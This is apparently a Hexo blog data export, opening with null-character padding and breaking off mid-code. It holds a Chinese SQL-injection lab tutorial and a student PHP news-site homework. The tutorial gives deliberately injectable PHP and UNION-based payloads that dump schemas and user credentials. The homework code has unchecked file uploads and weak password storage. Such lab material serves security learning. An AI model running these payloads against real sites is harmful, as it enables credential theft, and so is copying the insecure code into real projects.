0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000","categories":[],"tags":[]},{"title":"8.13注入白黑盒测试","slug":"8.13注入白黑盒测试","date":"2019-08-13T14:08:41.430Z","updated":"2019-08-13T14:12:43.784Z","comments":true,"path":"2019/08/13/8.13注入白黑盒测试/","link":"","permalink":"https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/","excerpt":"在这里可以进行白盒or黑盒，就此对两种方法都进行说明。","text":"在这里可以进行白盒or黑盒，就此对两种方法都进行说明。 白盒测试代码如下： 12345678910111213141516&lt;?php @$con = mysql_connect('127.0.0.1', 'root', 'root'); mysql_select_db('mysql'); @$q = $_POST['sql']; $sql = 'SELECT * FROM `mysql`.`user` WHERE `user` = \\'root\\' ' . $q; echo \"将执行了sql语句: &#123;$sql&#125;&lt;br&gt;&lt;br&gt;\"; $res = mysql_query($sql) or die(mysql_error()); if ($res) &#123; $arr = mysql_fetch_array($res); echo \"查询的结果为:&lt;br&gt;&lt;br&gt;&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $arr[0] . \"&lt;/td&gt;&lt;td&gt;\" . $arr[1] . \"&lt;/td&gt;&lt;td&gt;\" . $arr[2] . \"&lt;/td&gt;&lt;/tr&gt;\"; &#125; ?&gt; mysql_fetch_array()函数定义如下： ​ mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。 ​ 大致就是将查询到的值以$arr[m]=xx这样的关联数组形式展示出来，且只显示第一行。但关联数组查询的数据会在接下来的行中显示。因此可以使用and 1=2使前面查询不到，就此我们关联查询的就可以显示出来。或者使用limit1,1将第二行读取出来。 三个回显位1echo &quot;&lt;td&gt;&quot; . $arr[0] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[1] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[2] . &quot;&lt;/td&gt;&lt;/tr&gt;&quot;; 在网页上共输出了$arr[0],$arr[1],$arr[2]这三个数组，由此可以得知：我们在关联查询时只能在前三位查询，否则即使查询到数据，也不会回显出来。 判断注入类型12@$q = $_POST['sql']; 'SELECT * FROM `mysql`.`user` WHERE `user` = \\'root\\' ' . $q; 在这里接收一个$q参数，并且用.将$q和前面的语句结合在一起。查询语句如下： 1SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; $q; 因此在这里可以看作“数字型”注入（原理像，请百度），就此直接在后面拼接上语句即可。 注入参数流程查找字段数老方法，既然没有过滤任何关键字。那直接使用二分法排序查询字段数。 1首先order by 30，可以看到有30个字段 1在使用order by 50，发现页面发生了变化。证明没有50个字段 1就此发现原来是49个字段 因为白盒审计已经知道前三位回显，接下来就可以使用基础语法去查询了。 1and 1=2 union select x,x,x,4,5,6,7,8,9,,,,,,47,48,49 查询数据库首先看一下关联数组时会用到的数组！ group_concat()函数 将所有查询到的数据都放在一起输出。如总共有10行，都放在一行输出。为什么要这样呢？因为前面用到了mysql_fetch_array()函数，只会读取一行。所以要将数据放在一行中进行读取。 查询数据库 1and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 查询表常规操作 1and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;ceshi&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 查询字段查询ceshi库content表中的字段 1and 1=2 union select 1,2,(select group_concat(ip,&apos;:&apos;,time) from ceshi.content),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 查询ceshi库users表中的字段 1and 1=2 union select 1,2,(select group_concat(column_name,&apos;::&apos;) from information_schema.COLUMNS where TABLE_NAME=&apos;users&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 查询数据查询users表中username 和 passwd的数据 1and 1=2 union select 1,2,(select group_concat(username,&apos;:&apos;,passwd) from ceshi.users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 查询数据 黑盒测试不想写了嗷，洗衣服去了","categories":[],"tags":[]},{"title":"新闻作业","slug":"新闻界面8.10周末作业","date":"2019-08-12T09:51:17.770Z","updated":"2019-08-13T06:22:18.071Z","comments":true,"path":"2019/08/12/新闻界面8.10周末作业/","link":"","permalink":"https://0xxk.github.io/2019/08/12/新闻界面8.10周末作业/","excerpt":"这是一个作业","text":"这是一个作业 结构: basedir:存放上下界面 ​ header.php 上 ​ footer.php下 data:存放新闻用户信息 ​ tupian 存放所有图片 ​ xinwenwenjian存放所有新闻的信息 ​ yonghuxinxiwenjian存放所有新闻文件 lib:存放功能界面 ​ index.php 主页包含界面 ​ login.php登陆界面 ​ register.php注册前端 ​ registerhoutai.php注册后端 ​ shanchuxinwen.php 删除新闻前端 ​ shanchuxinwenhouduan.php删除新闻后端 ​ shanchuangtouxiang.php 上传头像前端 ​ shanchuangtouxianghoutai.php上传头像后端 ​ xinwenzhanshi.php新闻展示界面 ​ xinwenzhanshimore.php新闻展示更多信息 ​ xiugaimima.php 修改密码前端 ​ xiugaimimamore.php 修改密码后端 ​ yonghutuichu.php 用户退出后端 ​ zengjiaxinwen.php 增加新闻前端 ​ zengjiaxinwenhoutai.php增加新闻后端 主页包含界面：12345&lt;?phpRequire_once '../basedir/header.php';?&gt; &lt;?phpRequire_once \"xinwenzhanshi.php\";?&gt; &lt;?phpRequire_once '../basedir/footer.php';?&gt; 登陆界面12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpRequire_once '../basedir/header.php';?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head &gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt; &lt;body&gt; &lt;hr&gt; &lt;div style=\"width:100%;text-align:center\"&gt; &lt;tr&gt; &lt;h1&gt;骚年输入的你的编号&lt;/h1&gt; &lt;form action=\"login.php\" method=\"post\" &gt; &lt;p&gt;&lt;input type=\"text\" name=\"name\" placeholder=\"手机号/邮箱/用户名\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"password\" name=\"passwd\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"input_code\" type=\"text\" name=\"verifycode\" placeholder=\"验证码\"&gt;&lt;/p&gt; &lt;img class=\"verifycode\" src=\"https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972\"&gt; &lt;p&gt;&lt;input type=\"submit\" name=\"提交\"&gt;&lt;/p&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"right\"&gt; &lt;a href=\"../lib/register.php\"&gt;&lt;button align=\"right\"&gt;用户注册&lt;/button&gt;&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;&lt;?phpRequire_once '../basedir/footer.php';?&gt;&lt;?phperror_reporting(E_ALL^E_NOTICE);$uname = base64_encode($_POST['name']);$upass = md5($_POST['passwd']);if ($uname &amp;&amp; $upass)&#123;// echo base64_decode($uname); $f = fopen('../data/yonghuxinxiwenjian/yh.db','r'); while (!feof($f))&#123; $data = fgets($f); $arr = explode('|',$data); if(count($arr) !=4 )&#123; continue; &#125;// echo base64_decode($arr[0]); if ($arr[0] == $uname &amp;&amp; $arr[1] == $upass)&#123; $idd = base64_decode($arr[0]); session_start(); $_SESSION['username']=$idd; echo \"&lt;script&gt;alert('登陆成功！将跳转到主页！');location.href='index.php';&lt;/script&gt;\"; break; &#125; &#125; echo \"&lt;script&gt;alert('用户名或者密码错误，请重新登录！');location.href='login.php';&lt;/script&gt;\";&#125;?&gt; 注册功能1234567891011121314151617181920212223242526272829303132333435363738394041424344454647前端&lt;?phpRequire_once &apos;../basedir/header.php&apos;;?&gt;&lt;hr&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;快来和我一起欢乐&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;tr&gt;&lt;form action=&quot;registerhoutai.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;h3&gt;&lt;p&gt;用户名&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;密码&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;再次确认密码&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd2&quot;&gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;输入你的邮箱&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;youxiang&quot;&gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;上传你的头像&lt;/p&gt;&lt;/h3&gt; &lt;p&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;&lt;/form&gt; &lt;/tr&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpRequire_once &apos;../basedir/footer.php&apos;;?&gt; 删除新闻功能 12 上传头像功能 新闻展示界面：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&lt;html&gt;&lt;style &gt; .th&#123; vertical-align: middle; &#125;&lt;/style&gt;&lt;div style=\"width:100%;text-align:center\"&gt; &lt;h1&gt;新闻界面&lt;/h1&gt;&lt;/div&gt;&lt;hr&gt;&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);if(isset($_SESSION['username']))&#123; echo &lt;&lt;&lt;EOF &lt;table align=\"center\" width=\"600\"&gt; &lt;tr &gt;&lt;th id=\"sctx\"&gt;&lt;a href=\"shangchuantouxiang.php\"&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id=\"zjxw\"&gt;&lt;a href=\"zengjiaxinwen.php\"&gt;增加新闻&lt;/a&gt;&lt;/th&gt;&lt;th id=\"scxw\"&gt;&lt;a href=\"shanchuxinwen.php\"&gt;删除新闻&lt;/th&gt;&lt;th id=\"xgmm\"&gt;&lt;a href=\"xiugaimima.php\"&gt;修改密码&lt;/th&gt;&lt;/tr&gt; &lt;/table&gt;EOF;&#125;?&gt;&lt;table align=\"center\" border=\"1\" width=\"1200\"&gt; &lt;tr&gt; &lt;th&gt; &lt;h2&gt;热度&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;标题&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;作者&lt;/h2&gt; &lt;/th&gt; &lt;th&gt; &lt;h2&gt;时间&lt;/h2&gt; &lt;/th&gt; &lt;/tr&gt; &lt;?php $f = fopen('../data/xinwenwenjian/new.db','r'); while (!feof($f))&#123; $str = fgets($f); $shuzu = explode(\"|\",$str); //echo \"长度为：\".strlen($shuzu[0]); if(count($shuzu) !=6)&#123; continue; &#125; $shuzu = explode('|',$str);//按照|进行分割 $redu = $shuzu[0]; $biaoti = base64_decode($shuzu[1]); $zuozhe = base64_decode($shuzu[2]); $shijian = base64_decode($shuzu[3]); $tupian = base64_decode($shuzu[4]); $jianjie= mb_substr(base64_decode($shuzu[5]),0,150); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td align=\"center\"&gt;&#123;$redu&#125;&lt;/td&gt; &lt;td align=\"center\"&gt;&#123;$biaoti&#125;&lt;/td&gt; &lt;td align=\"center\"&gt;&#123;$zuozhe&#125;&lt;/td&gt; &lt;td align=\"center\"&gt;&#123;$shijian&#125;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"center\" height: 30px; width: 300px; text-align: center;&gt; &lt;img height=\"150px\" src=&#123;$tupian&#125; &gt; &lt;/td&gt; &lt;td colspan=\"3\" align=\"center\" colspan=\"3\"&gt;&lt;a href=\"xinwenzhanshimore.php?action=&#123;$biaoti&#125;\"&gt;&#123;$jianjie&#125;&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt;EOF; &#125; ?&gt;&lt;/table&gt;&lt;/html&gt;后端&lt;?phpif ($_POST['passwd'] != $_POST['passwd2'])&#123; echo \"&lt;script&gt;alert('两次输入的密码不正确')&lt;/script&gt;\"; die();&#125;$f = fopen(\"../data/yonghuxinxiwenjian/yh.db\",\"r\");while(!feof($f))&#123; $zifuchuan = fgets($f); $zifuchuan = explode(\"|\",$zifuchuan);// echo $_POST['name'];// echo base64_decode($zifuchuan[0]); if($_POST['name'] == base64_decode($zifuchuan[0]))&#123; echo \"&lt;script&gt;alert('此账号已被注册');location.href='register.php';&lt;/script&gt;\"; die(); &#125;&#125;$name = base64_encode($_POST['name']);$passwd = md5($_POST['passwd']);$youxiang = base64_encode($_POST['youxiang']);$filename= $_FILES['file']['name'];$filehouzui = explode('.',$filename); //根据.来分割$filezhenshiming = $_POST['name'].'.'.$filehouzui[1];//将分割出来的后缀和.合并到一起$filebaocunlujing = \"../data/yonghuxinxiwenjian/\".$filezhenshiming;//此处为保存路径move_uploaded_file($_FILES['file']['tmp_name'],$filebaocunlujing);$filebaocunlujing = base64_encode($filebaocunlujing);$f = fopen(\"../data/yonghuxinxiwenjian/yh.db\",\"a+\");$shuju = \"$name|$passwd|$youxiang|$filebaocunlujing\".\"\\n\";fwrite($f ,$shuju );fclose($f);session_start();$_SESSION['username']=$_POST['name'];echo \"&lt;script&gt;alert('恭喜你注册成功！即将跳转到主面！');location.href='index.php';&lt;/script&gt;\";?&gt; 修改密码功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163前端&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);if(!isset($_SESSION[&apos;username&apos;]))&#123; echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;&#125;?&gt;&lt;?phpRequire_once &apos;../basedir/header.php&apos;;?&gt;&lt;html&gt;&lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;h1&gt;修改密码&lt;/h1&gt;&lt;/div&gt;&lt;hr&gt;&lt;?phpif(isset($_SESSION[&apos;username&apos;]))&#123; echo &lt;&lt;&lt;EOF &lt;table align=&quot;center&quot; width=&quot;600&quot;&gt; &lt;tr &gt;&lt;th id=&quot;sctx&quot;&gt;&lt;a href=&quot;shangchuantouxiang.php&quot;&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id=&quot;xwjm&quot;&gt;&lt;a href=&quot;zengjiaxinwen.php&quot;&gt;增加新闻&lt;/th&gt;&lt;th id=&quot;scxw&quot;&gt;&lt;a href=&quot;shanchuxinwen.php&quot;&gt;删除新闻&lt;th id=&quot;xgmm&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;新闻界面&lt;/th&gt;&lt;/tr&gt; &lt;/table&gt;EOF;&#125;?&gt;&lt;/html&gt;&lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;tr&gt;&lt;form action=&quot;xiugaimimahoutai.php&quot; method=&quot;post&quot; &gt; &lt;h3&gt;&lt;p&gt;原密码&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;ypasswd&quot; &gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;修密码&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;tpasswd&quot; &gt;&lt;/p&gt; &lt;h3&gt;&lt;p&gt;再次输入密码&lt;/p&gt;&lt;/h3&gt; &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;tpasswd2&quot; &gt;&lt;/p&gt; &lt;p&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;&lt;/form&gt; &lt;/tr&gt;&lt;?phpRequire_once &apos;../basedir/footer.php&apos;;?&gt;后端&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);$uname = base64_encode($_SESSION[&apos;username&apos;]);$upass = md5($_POST[&apos;ypasswd&apos;]);$q = 0;if ($uname &amp;&amp; $upass)&#123;// echo base64_decode($uname); $f = fopen(&apos;../data/yonghuxinxiwenjian/yh.db&apos;,&apos;r&apos;); while (!feof($f))&#123; $data = fgets($f); $arr = explode(&apos;|&apos;,$data); if(count($arr) !=4 )&#123; continue; &#125;// echo $arr[0];// echo &apos;:&apos;;// echo $uname;// echo &apos;&lt;br&gt;&apos;;// echo $arr[1];// echo &apos;:&apos;;// echo $upass;// echo &apos;&lt;br&gt;&apos;; if ($arr[0] == $uname &amp;&amp; $arr[1] == $upass)&#123; $q = 1; &#125; &#125; if($q == 0)&#123; echo &quot;&lt;script&gt;alert(&apos;原密码错误！&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;; die(); &#125;&#125;$a = 0;if ($_POST[&apos;tpasswd&apos;] != $_POST[&apos;tpasswd2&apos;])&#123; echo &quot;&lt;script&gt;alert(&apos;两次输入的密码不正确&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;; die();&#125;else&#123; $a=1;&#125;if($q &amp;&amp; $a)&#123; $filePath = &apos;../data/yonghuxinxiwenjian/yh.db&apos;; $target= md5($_POST[&apos;ypasswd&apos;]); $result = null; $fileCont = file_get_contents($filePath); $target = base64_encode($_SESSION[&apos;username&apos;]).&apos;|&apos;.$target;// echo $target;// echo &apos;&lt;br&gt;&apos;;// echo $fileCont;// echo &apos;&lt;br&gt;&apos;; $targetIndex = strpos($fileCont, $target); #查找目标字符串的坐标 echo $targetIndex; if ($targetIndex !== false) &#123; #找到target的前一个换行符 $preChLineIndex = strrpos(substr($fileCont, 0, $targetIndex+1), &quot;\\n&quot;); var_dump($preChLineIndex);// var_dump($targetIndex);// var_dump($preChLineIndex); #找到target的后一个换行符 $AfterChLineIndex = strpos(substr($fileCont, $targetIndex), &quot;\\n&quot;) + $targetIndex; $tihuanhang = substr($fileCont,$preChLineIndex,$AfterChLineIndex); $target2 = base64_encode($_SESSION[&apos;username&apos;]).&apos;|&apos;.md5($_POST[&apos;tpasswd&apos;]); var_dump($target2); var_dump($target); $tihuanhang = str_replace($target,$target2,$tihuanhang); var_dump($tihuanhang); var_dump($AfterChLineIndex); if (($preChLineIndex !== false || $preChLineIndex == 0) &amp;&amp; $AfterChLineIndex !== false) &#123; #重新写入删掉指定行后的内容 $result = substr($fileCont, 0, $preChLineIndex + 1) .$tihuanhang. substr($fileCont, $AfterChLineIndex + 1); file_put_contents($filePath, $result); $fp = fopen($filePath, &quot;w+&quot;); fwrite($fp, $result); fclose($fp); &#125; echo &quot;&lt;script&gt;alert(&apos;密码修改成功&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;; &#125;&#125;?&gt; 用户退出功能12345678910111213141516171819后端&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);unset($_SESSION[&apos;username&apos;]);?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;script&gt;alert(&apos;登出成功！将跳转到主页！&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 增加新闻功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108前端&lt;?phpsession_start();error_reporting(E_ALL^E_NOTICE);if(!isset($_SESSION[&apos;username&apos;]))&#123; echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;&#125;?&gt;&lt;?php Require_once &apos;../basedir/header.php&apos;;?&gt;&lt;html&gt; &lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;h1&gt;增加新闻&lt;/h1&gt; &lt;/div&gt; &lt;hr&gt; &lt;?php session_start();if(isset($_SESSION[&apos;username&apos;]))&#123; echo &lt;&lt;&lt;EOF &lt;table align=&quot;center&quot; width=&quot;600&quot;&gt; &lt;tr &gt;&lt;th id=&quot;sctx&quot;&gt;&lt;a href=&quot;shangchuantouxiang.php&quot;&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id=&quot;xwjm&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;新闻界面&lt;/th&gt;&lt;th id=&quot;scxw&quot;&gt;&lt;a href=&quot;shanchuxinwen.php&quot;&gt;删除新闻&lt;/th&gt;&lt;th id=&quot;xgmm&quot;&gt;&lt;a href=&quot;xiugaimima.php&quot;&gt;修改密码&lt;/th&gt;&lt;/tr&gt; &lt;/table&gt;EOF; &#125; ?&gt; &lt;div style=&quot;width:100%;text-align:center&quot;&gt; &lt;tr&gt; &lt;h3&gt;骚年请上传新闻&lt;/h3&gt; &lt;form action=&quot;zengjiaxinwenhoutai.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;h5&gt;&lt;p&gt;热度:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;redu&quot; id=&quot;redu&quot; &gt;&lt;/p&gt;&lt;/h5&gt; &lt;h5&gt;&lt;p&gt;标题:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;biaoti&quot; id=&quot;biaoti&quot; &gt;&lt;/p&gt;&lt;/h5&gt; &lt;p&gt;&lt;input type=&quot;file&quot; name=&quot;Filedata&quot; &gt;&lt;br&gt;&lt;/p&gt; &lt;h5&gt;&lt;p&gt;简介:&lt;br&gt;&lt;textarea name=&quot;jianjie&quot; placeholder=&quot;输入新闻内容&quot; rows=&quot;10&quot; cols=&quot;50&quot; &gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;/h5&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt; &lt;/form&gt; &lt;/tr&gt; &lt;/div&gt; &lt;body&gt;&lt;/html&gt;&lt;?php Require_once &apos;../basedir/footer.php&apos;;?&gt;后端&lt;?phperror_reporting(E_ALL^E_NOTICE);session_start();$redu = $_POST[&quot;redu&quot;];$biaoti = 